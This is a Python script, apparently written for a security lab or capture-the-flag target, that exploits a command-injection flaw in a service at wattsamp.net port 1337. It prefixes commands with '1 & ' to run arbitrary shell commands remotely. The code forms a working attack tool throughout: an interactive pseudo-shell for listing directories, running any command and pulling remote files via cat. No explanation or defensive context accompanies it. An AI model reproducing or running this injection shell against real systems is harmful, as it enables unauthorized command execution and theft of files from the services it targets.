import socket
import os

host = "wattsamp.net" # IP address here
port = 1337 # Port here

def execute_cmd(cmd):
      # s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      # s.connect((host, port))

      # response = s.recv(1024)
      # s.send(("1 & " + cmd + "\n").encode())
      # response = s.recv(1024)
      # print(response.decode())
      # s.close()

      quit_program = False
      while (not quit_program):
            if cmd == "quit":
                  quit_program = True
            if cmd == "help":
                  print("1. shell - Drop into an interactive shell and allow users to gracefully exit")
                  print("2. pull <remote-path> <local-path> - Download files")
                  print("3. help - Shows this help menu")
                  print("4. quit - Quit the shell")
                  cmd = input('> ')
            if cmd == "shell":
                  path = "/"
                  exit_shell = False
                  shell_cmd = input(path + "> ")
                  
                  while (not exit_shell):

                        #Exit shell
                        if (shell_cmd == "exit"):
                              exit_shell = True

                        #Process ls command
                        elif shell_cmd[0:2] == "ls":
                              arg = ""
                              if len(shell_cmd.split(" ")) > 1:
                                    arg = shell_cmd.split(" ")[1]
                              
                              s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                              s.connect((host, port))
                              s.recv(1024)
                              s.send(("1 & ls " + path + "/" + arg + "\n").encode())
                              print(s.recv(1024).decode())
                              shell_cmd = input(path + "> ")

                        #Process cd command
                        elif shell_cmd[0:2] == "cd":
                              arg = ""
                              if len(shell_cmd.split(" ")) > 1:
                                    arg = shell_cmd.split(" ")[1]

                              path = arg
                              shell_cmd = input(path + "> ")
                        elif shell_cmd[0:4] == "pull":
                              args = shell_cmd.split()
                              f = open(args[2], "w")
                              s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                              s.connect((host, port))
                              s.recv(1024)
                              s.send(("1 & cat " + path + "/" + args[1] + "\n").encode())
                              data = s.recv(1024).decode()
                              f.write(data)
                              f.close()
                              shell_cmd = input(path + "> ")
                        else:
                              args = shell_cmd.split()
                              if len(args) > 1:
                                    args[1] = path + "/" + args[1]
                              shell_cmd = ""
                              for i in args:
                                    shell_cmd += i + " "
                              print(shell_cmd)
                              s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                              s.connect((host, port))
                              s.recv(1024)
                              s.send(("1 & " + shell_cmd + "\n").encode())
                              print(s.recv(1024).decode())
                              shell_cmd = input(path + "> ")
                  cmd = input(">")                        
            else:
                  cmd = input('> ')
if __name__ == '__main__':
      command = input('> ')
      execute_cmd(command)

      





